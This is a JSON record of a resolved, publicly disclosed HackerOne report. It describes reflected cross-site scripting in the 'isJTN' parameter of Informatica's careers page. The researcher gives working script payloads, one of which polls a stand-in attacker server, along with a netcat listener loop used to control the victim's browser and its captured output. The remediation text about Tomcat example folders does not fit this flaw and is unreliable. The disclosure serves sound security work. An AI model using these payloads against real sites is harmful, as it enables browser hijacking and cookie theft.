@@ -1,0 +1,156 @@
+{
+  "id": 147196,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDcxOTY=",
+  "url": "https://hackerone.com/reports/147196",
+  "title": "[careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-06-25T14:28:47.229Z",
+  "submitted_at": "2016-06-25T14:28:47.229Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zephrfish",
+    "url": "/zephrfish",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tpurqiphz65lpdcpnqemedj5jbyd/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-31T00:20:57.583Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-01T00:20:50.194Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "#####Description\nCross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.\n\n\n#####Issue\nThe consultant identified that the careers page is vulnerable to reflected cross site scripting, this means that a malicious user can craft a link to compromise a user, the user simple needs to click on the link and the payload is launched. \n\n----------\n#####Affected URLs\n    https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E\n\nFrom the affected URL it can be seen that the `isJTN` parameter can be given any javascript code or HTML tags and it will execute the code within. The above payload simply launches a prompt box with the consultant's hackerone username ZephrFish. However cross site scripting can be further weaponised to hook a victim's browser and cause further damage. See the proof of concept section below for a full weaponised scenario using this reflected cross site scripting to execute client side code execution.\n\n####Risk: **High**\nThis issue has been marked as high due to  the risk of compromise being on the user rather than server side, however this should still be considered as an issue and dealt with accordingly, if an attacker is able to compromise a victim's browser they can do far worse than pop an alert message. This is essentially a new form of reflected cross site scripting which is persistent to the user's browser being open.\n\n#####Remediaton\nImplement http authentication on the affected directories, or alternatively  remove the examples folder entirely to prevent the attack surface.  Consider following a lockdown procedure against the installation and updating Tomcat to a newer instance. \n\n#####Weaponising Cross Site Scripting\nThe following example demonstrates how an attacker can establish a persistent connection to a victim's browser and proceed to execute arbitrary commands on the victim's machine.\n\n**The hook**\nThe victim receives a malicious link, similar to that shown below:\n\n    https://careers.informatica.com/apply?isJTN=<script>setInterval(function(){d=document;z=d.createElement(\"script\");z.src=\"//AttackerServerIP:ANYPORT\";d.body.appendChild(z)},0)</script>\n\nAttacker Server:\nThe attacker runs the following code to catch the shell with netcat:\n\n    while :; do printf \"ZephrFishHackerOne>$ \"; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done\n\nWhen this link is clicked on the attacker's server will catch a shell and allow the attacker to execute arbitrary commands on the victim's browser as shown in the attached screenshots, these commands can be any javascript commands including theft of cookies, redirection of victim's browser or in some cases malware delivery.\n\nThe following shows what is shown on the attacker's server when a valid connection attempt is received:\n\n    [root@inform]# while :; do printf \"ZephrFishHackerOne>$ \"; read c; echo $c | nc -vvlp 533 >/dev/null; done\n    ZephrFishHackerOne>$ alert('Shell')\n    listening on [any] 533 ...\n    connect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIM BROWSERIP] 55730\n     sent 15, rcvd 245\n\n\n#####References\n\n - [OWASP: Cross Site Scripting Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)\n\n#####Request & Response\nGET Request\n\n    GET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1\n    Host: careers.informatica.com\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate, br\n    Cookie: AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16977%7CMCMID%7C43066833403543674402896414893465241440%7CMCAID%7CNONE%7CMCAAMLH-1467332027%7C6%7CMCAAMB-1467332028%7CNRX38WO0n5BH8Th-nqAG_A; mbox=PC#1466727226198-680058.26_3#1468009316|check#true#1466799776|session#1466799715648-663873#1466801576; s_nr=1466799716120-Repeat; s_vnum=1469319227675%26vn%3D3; mktrest_end_time=1466727232954; mktrest_cookie=anonymous; wooTracker=pFDG1ZqP3HWn; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1466727758906-39922; mrkto_lead=\"{\\\"requestId\\\":\\\"11ba9#1557fcb4463\\\",\\\"result\\\":[],\\\"success\\\":true,\\\"marketoCall\\\":\\\"false\\\"}\"; do_mkto_call=false; _ga=GA1.2.935149421.1466727762\n    Connection: close\n    \n\n   \nResponse\n\n    HTTP/1.1 200 OK\n    Content-Language: en-US\n    Content-Type: text/html;charset=utf-8\n    Date: Sat, 25 Jun 2016 14:14:16 GMT\n    Server: Apache-Coyote/1.1\n    Strict-Transport-Security: max-age=63072000; includeSubdomains; preload\n    Vary: Accept-Encoding\n    Connection: Close\n    Content-Length: 53097\n    ---snip---\n                var payload = {fileUrl: link, jobSeqNo: jobId, refNum: refNum, isQuickApply: isQuickApply,\n                                actualJobId: actualJobId, title: title, location: location,\n                                applySource: applySource, applyUrl: applyUrl, category: category, isJTN: \"<script>prompt('ZephrFish')</script>\",\n                                atsApplyDataId:atsApplyDataId,atsApplyStatusId:atsApplyStatusId, applyType: applyType,\n                                screenWidth: screen.width, screenHeight: screen.height}\n               sendDownloadResume(payload) \n    ---snip---\n\n",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 101556,
+      "file_name": "xss_shell_career.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/101/556/a2684f9ded0ba6d3818e2e78f30652b43e4896fb/xss_shell_career.png?response-content-disposition=attachment%3B%20filename%3D%22xss_shell_career.png%22%3B%20filename%2A%3DUTF-8%27%27xss_shell_career.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYY4SI2D%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153119Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDuqGDqs1tvaNWhOkIGoaKoJ4SlyK9RmryG4Oky4U%2FuBwIhALc6FVzi9iwXU%2F073p4GH5Rq3z7LMuCjqFPMxCGA%2FIbIKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwOwnvr0lE9InZ%2BZ4MqjwVpY%2BZFTusxomT9%2BD4RnzxzHNVMmP0MW1RKpekK8J3rFii%2BNnHhWhxcv4d2Qrncbn3fTaaJgUCRw%2B%2BhDEG4nWhnNnGTwKHTT3tYg0dR%2FRcdrGhEMXzJBrwzv33QPY8XqzkJfCXsTB1ZDA2OAqucxJSrftgiwkaedHZzNx44CBj0i86cLxTiTbJVbf%2BEJue8CrUkRqeiyH%2BkVuljwG6lOTpN8FH6aW1w65oeQSVt1v2dmqXa1goqx26hK5r%2Bn6WeRExSTePNX%2BQaqMEwHPTAYJT5XDabggBtR8Gez1cys5nKwFZIM9ADI23HRXcgms8hMj8JP7W9CTkrg%2B2xWRPaCXvfUtnYY0%2BbAFSiY%2FrlP7Nn4ldy%2FsYpICiEXGGnMMMcc3XCo9IXecq23bObeeijNLvg68tKZeZqaQo%2FJJhN9pv6hhE9FYOCIYQ0I31GDBbnX1T7Vh%2FZpy%2BRhRNLEwygyXiVcbRojaCVGQWF3PCuK3X4STfaVbTRTyO5rh89ITRcUWgGjGJtmZ4p7jttkt4THs1xalaqoRmHtpVL1SYa3ANphJ4I7bUEjB%2Bahy37tcZB8Z3hOIM6eFuhvBBUsMUHCefXvp1GoZtIHaxwXeOWDll15zqUp7xyDe3pSWsnjvLlzawSIsiCHbZLoy3Y1QTPrCd%2F%2FqJNc9Eto%2FW1%2BF8t3%2BoELeqktAIK8BcjuJ%2BkkVCTziATVZPr46Ocj6wfle%2BVmXC2cBcFDux3uWPno9Fa6UpkEG4nBCrAEaHSet%2BMx4MCLnxM4Fk2XyAHNKb0QVsBNl46wF7l2zB%2BfLVUc5LTBkhZG9wDuqjwPor%2FhoxvEdCblYYFmZuFaVdYp%2FTh2JFAGlF7o2cUvMhXyyCBNMXoJlzlMPyK%2Fc8GOrABFk21VbPFL734OH2aozAhjnZ6qqe6mTno6mrMT8D%2BdopoFRNjoIeQFnQDUgNDDW0RdJzE8FoQj2rnBQW7hESjclwdnliiCH9GoK4vKSA0rIHMbR5k03rjl%2BGcz4TKdG2cicYqmu235Y0WQshpPftNDi74b9Hzyv86l0k1f%2F5ilhRIA9tfs0ct9sk7q4i%2Fqft4GIDdrPFOihSPhx7hWO1YpujNZAIO0wKNe2DcTVUT5u4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9890e589bc297045100535a0e2b4ba6645c183c4cad507d2f3af92615a6af57a",
+      "file_size": 12683,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 101557,
+      "file_name": "careers-xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/101/557/66950a3542b43ea754dc7812f12bb1b545acdff3/careers-xss.png?response-content-disposition=attachment%3B%20filename%3D%22careers-xss.png%22%3B%20filename%2A%3DUTF-8%27%27careers-xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYY4SI2D%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153119Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDuqGDqs1tvaNWhOkIGoaKoJ4SlyK9RmryG4Oky4U%2FuBwIhALc6FVzi9iwXU%2F073p4GH5Rq3z7LMuCjqFPMxCGA%2FIbIKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwOwnvr0lE9InZ%2BZ4MqjwVpY%2BZFTusxomT9%2BD4RnzxzHNVMmP0MW1RKpekK8J3rFii%2BNnHhWhxcv4d2Qrncbn3fTaaJgUCRw%2B%2BhDEG4nWhnNnGTwKHTT3tYg0dR%2FRcdrGhEMXzJBrwzv33QPY8XqzkJfCXsTB1ZDA2OAqucxJSrftgiwkaedHZzNx44CBj0i86cLxTiTbJVbf%2BEJue8CrUkRqeiyH%2BkVuljwG6lOTpN8FH6aW1w65oeQSVt1v2dmqXa1goqx26hK5r%2Bn6WeRExSTePNX%2BQaqMEwHPTAYJT5XDabggBtR8Gez1cys5nKwFZIM9ADI23HRXcgms8hMj8JP7W9CTkrg%2B2xWRPaCXvfUtnYY0%2BbAFSiY%2FrlP7Nn4ldy%2FsYpICiEXGGnMMMcc3XCo9IXecq23bObeeijNLvg68tKZeZqaQo%2FJJhN9pv6hhE9FYOCIYQ0I31GDBbnX1T7Vh%2FZpy%2BRhRNLEwygyXiVcbRojaCVGQWF3PCuK3X4STfaVbTRTyO5rh89ITRcUWgGjGJtmZ4p7jttkt4THs1xalaqoRmHtpVL1SYa3ANphJ4I7bUEjB%2Bahy37tcZB8Z3hOIM6eFuhvBBUsMUHCefXvp1GoZtIHaxwXeOWDll15zqUp7xyDe3pSWsnjvLlzawSIsiCHbZLoy3Y1QTPrCd%2F%2FqJNc9Eto%2FW1%2BF8t3%2BoELeqktAIK8BcjuJ%2BkkVCTziATVZPr46Ocj6wfle%2BVmXC2cBcFDux3uWPno9Fa6UpkEG4nBCrAEaHSet%2BMx4MCLnxM4Fk2XyAHNKb0QVsBNl46wF7l2zB%2BfLVUc5LTBkhZG9wDuqjwPor%2FhoxvEdCblYYFmZuFaVdYp%2FTh2JFAGlF7o2cUvMhXyyCBNMXoJlzlMPyK%2Fc8GOrABFk21VbPFL734OH2aozAhjnZ6qqe6mTno6mrMT8D%2BdopoFRNjoIeQFnQDUgNDDW0RdJzE8FoQj2rnBQW7hESjclwdnliiCH9GoK4vKSA0rIHMbR5k03rjl%2BGcz4TKdG2cicYqmu235Y0WQshpPftNDi74b9Hzyv86l0k1f%2F5ilhRIA9tfs0ct9sk7q4i%2Fqft4GIDdrPFOihSPhx7hWO1YpujNZAIO0wKNe2DcTVUT5u4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0f7dbad323b028150fec9394a275e5af3b093e86753bac5b3072aa4453fb2281",
+      "file_size": 117114,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 101558,
+      "file_name": "xss_shell_career-commands.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/101/558/3dc6e46e316795e8bea017bcd40f5ffd8e724402/xss_shell_career-commands.png?response-content-disposition=attachment%3B%20filename%3D%22xss_shell_career-commands.png%22%3B%20filename%2A%3DUTF-8%27%27xss_shell_career-commands.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYY4SI2D%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153119Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDuqGDqs1tvaNWhOkIGoaKoJ4SlyK9RmryG4Oky4U%2FuBwIhALc6FVzi9iwXU%2F073p4GH5Rq3z7LMuCjqFPMxCGA%2FIbIKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwOwnvr0lE9InZ%2BZ4MqjwVpY%2BZFTusxomT9%2BD4RnzxzHNVMmP0MW1RKpekK8J3rFii%2BNnHhWhxcv4d2Qrncbn3fTaaJgUCRw%2B%2BhDEG4nWhnNnGTwKHTT3tYg0dR%2FRcdrGhEMXzJBrwzv33QPY8XqzkJfCXsTB1ZDA2OAqucxJSrftgiwkaedHZzNx44CBj0i86cLxTiTbJVbf%2BEJue8CrUkRqeiyH%2BkVuljwG6lOTpN8FH6aW1w65oeQSVt1v2dmqXa1goqx26hK5r%2Bn6WeRExSTePNX%2BQaqMEwHPTAYJT5XDabggBtR8Gez1cys5nKwFZIM9ADI23HRXcgms8hMj8JP7W9CTkrg%2B2xWRPaCXvfUtnYY0%2BbAFSiY%2FrlP7Nn4ldy%2FsYpICiEXGGnMMMcc3XCo9IXecq23bObeeijNLvg68tKZeZqaQo%2FJJhN9pv6hhE9FYOCIYQ0I31GDBbnX1T7Vh%2FZpy%2BRhRNLEwygyXiVcbRojaCVGQWF3PCuK3X4STfaVbTRTyO5rh89ITRcUWgGjGJtmZ4p7jttkt4THs1xalaqoRmHtpVL1SYa3ANphJ4I7bUEjB%2Bahy37tcZB8Z3hOIM6eFuhvBBUsMUHCefXvp1GoZtIHaxwXeOWDll15zqUp7xyDe3pSWsnjvLlzawSIsiCHbZLoy3Y1QTPrCd%2F%2FqJNc9Eto%2FW1%2BF8t3%2BoELeqktAIK8BcjuJ%2BkkVCTziATVZPr46Ocj6wfle%2BVmXC2cBcFDux3uWPno9Fa6UpkEG4nBCrAEaHSet%2BMx4MCLnxM4Fk2XyAHNKb0QVsBNl46wF7l2zB%2BfLVUc5LTBkhZG9wDuqjwPor%2FhoxvEdCblYYFmZuFaVdYp%2FTh2JFAGlF7o2cUvMhXyyCBNMXoJlzlMPyK%2Fc8GOrABFk21VbPFL734OH2aozAhjnZ6qqe6mTno6mrMT8D%2BdopoFRNjoIeQFnQDUgNDDW0RdJzE8FoQj2rnBQW7hESjclwdnliiCH9GoK4vKSA0rIHMbR5k03rjl%2BGcz4TKdG2cicYqmu235Y0WQshpPftNDi74b9Hzyv86l0k1f%2F5ilhRIA9tfs0ct9sk7q4i%2Fqft4GIDdrPFOihSPhx7hWO1YpujNZAIO0wKNe2DcTVUT5u4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=693a8059f8af8edf362e1c3280aa23e21663d63c923ac660dbc785a3560ffa3e",
+      "file_size": 156678,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-12-31T00:20:50.228Z",
+  "allow_singular_disclosure_after": -295197029.7311798,
+  "singular_disclosure_allowed": true,
+  "vote_count": 49,
+  "voters": [
+    "sameoldstory",
+    "delimitry",
+    "proabiral",
+    "bogdantc",
+    "shubs",
+    "sameerphad72",
+    "suv",
+    "icanthack",
+    "fillawful",
+    "flashdisk",
+    "and 39 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
